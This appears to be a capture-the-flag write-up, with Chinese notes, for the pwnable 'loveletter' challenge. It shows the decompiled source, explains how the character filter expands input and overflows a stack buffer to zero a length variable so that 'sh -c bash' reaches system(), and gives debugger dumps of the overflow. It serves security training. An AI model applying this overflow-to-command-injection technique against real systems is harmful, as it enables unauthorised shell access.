# loverletter

```
loveletter@pwnable:~$ checksec loveletter 
[*] '/home/loveletter/loveletter'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```


```
loveletter@pwnable:~$ ./loveletter 
♥ My lover's name is : adf^()[]{}$\\
♥ Whatever happens, I'll protect her...
♥ Impress her upon my memory...
♥ Her name echos in my mind...
I love adf♥♥♥♥♥♥♥♥♥♥D�♥��-��s�♥�p�♥�� ♥L♥��-��ɏ♥��J♥��-��@.��K�♥�p�-��tJ♥��♥� very much!
```

protect 判斷輸入有出現非預期的字，就會替換成三個字元

導致於 nn_input_name size 會變長，並且因為他在 stack 上面，我們可以控制 nn_len_prolog 讓他長度變小，變成0

這樣在 memcpy prolog 時就不會複製東西，第二次 memcpy 就會複製上我們的 `sh -c bash`，第三次不重要

接下來呼叫 system 就會拿到 shell


```clike=
.bss:0804A0A0                 public loveletter
.bss:0804A0A0 ; char loveletter[256]
.bss:0804A0A0 loveletter      db 100h dup(?)          ; DATA XREF: main+33↑o
.bss:0804A0A0                                         ; main+1CA↑o
.bss:0804A0A0 _bss            ends

unsigned int __cdecl protect(const char *nn_input)
{
  size_t v1; // ebx
  size_t v2; // eax
  size_t i; // [esp+1Ch] [ebp-12Ch]
  size_t j; // [esp+20h] [ebp-128h]
  char v6[4]; // [esp+25h] [ebp-123h]
  char dest; // [esp+3Ch] [ebp-10Ch]
  unsigned int v8; // [esp+13Ch] [ebp-Ch]

  v8 = __readgsdword(0x14u);
  strcpy(v6, "#&;`'\"|*?~<>^()[]{}$\\,");
  for ( i = 0; i < strlen(nn_input); ++i )
  {
    for ( j = 0; j < strlen(v6); ++j )
    {
      if ( nn_input[i] == v6[j] )
      {
        strcpy(&dest, &nn_input[i + 1]);        // copy next ,skip current 
        *(_DWORD *)&nn_input[i] = 0xA599E2;      // replace with 3 chars 
        v1 = strlen(&dest);                
        v2 = strlen(nn_input);
        memcpy((void *)&nn_input[v2], &dest, v1);// concat string , means len+=2
      }
    }
  }
  return __readgsdword(0x14u) ^ v8;
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char nn_input_name[256]; // [esp+10h] [ebp-114h]
  size_t nn_len_prolog; // [esp+110h] [ebp-14h]
  size_t nn_len_epilog; // [esp+114h] [ebp-10h]
  size_t nn_len_input; // [esp+118h] [ebp-Ch]
  unsigned int v8; // [esp+11Ch] [ebp-8h]

  v8 = __readgsdword(0x14u);
  memset(loveletter, 0, 0x100u);
  nn_len_epilog = strlen(epilog);
  nn_len_prolog = strlen(prolog);
  printf(&format);                              // print my lover is
  fgets(nn_input_name, 256, stdin);
  if ( nn_input_name[strlen(nn_input_name) - 1] == '\n' )
    nn_input_name[strlen(nn_input_name) - 1] = 0;
  puts(&s);                                     // print protect her
  protect(nn_input_name);
  nn_len_input = strlen(nn_input_name);
  puts(&byte_8048A50);                          // print impress
  memcpy((void *)((unsigned __int16)idx + 0x804A0A0), prolog, nn_len_prolog);  // write to loveletter 
    // echo I love 
  idx += nn_len_prolog;
  memcpy((void *)((unsigned __int16)idx + 0x804A0A0), nn_input_name, nn_len_input);
  idx += nn_len_input;
  memcpy((void *)((unsigned __int16)idx + 0x804A0A0), epilog, nn_len_epilog);// very much!
  idx += nn_len_epilog;
  puts(&byte_8048A74);
  return system(loveletter);
}
```



```
初始化時
pwndbg> x/2wx $esp+0x110
0xffffd0d0:     0x0000000c      0x0000000b
pwndbg> x/8bx $esp+0x110
0xffffd0d0:     0x0c    0x00    0x00    0x00    0x0b    0x00    0x00    0x00

覆蓋後

pwndbg> x $esp+0x110
0xffa530a0:     0x00000000
pwndbg> x/68wx $ebp-0x114
0xffa52fa4:     0x61622063      0x41206873      0x41414141      0x41414141
0xffa52fb4:     0x41414141      0x41414141      0x41414141      0x41414141
0xffa52fc4:     0x41414141      0x41414141      0x41414141      0x41414141
0xffa52fd4:     0x41414141      0x41414141      0x41414141      0x41414141
0xffa52fe4:     0x41414141      0x41414141      0x41414141      0x41414141
0xffa52ff4:     0x41414141      0x41414141      0x41414141      0x41414141
0xffa53004:     0x41414141      0x41414141      0x41414141      0x41414141
0xffa53014:     0x41414141      0x41414141      0x41414141      0x41414141
0xffa53024:     0x41414141      0x41414141      0x41414141      0x41414141
0xffa53034:     0x41414141      0x41414141      0x41414141      0x41414141
0xffa53044:     0x41414141      0x41414141      0x41414141      0x41414141
0xffa53054:     0x41414141      0x41414141      0x41414141      0x41414141
0xffa53064:     0x41414141      0x41414141      0x41414141      0x41414141
0xffa53074:     0x41414141      0x41414141      0x41414141      0x41414141
0xffa53084:     0x41414141      0x41414141      0x41414141      0x41414141
0xffa53094:     0x41414141      0x41414141      0xa599e241      0x00000000
0xffa530a4:     0x0000000b      0x00000100      0xab71c400      0xffa5437e
```
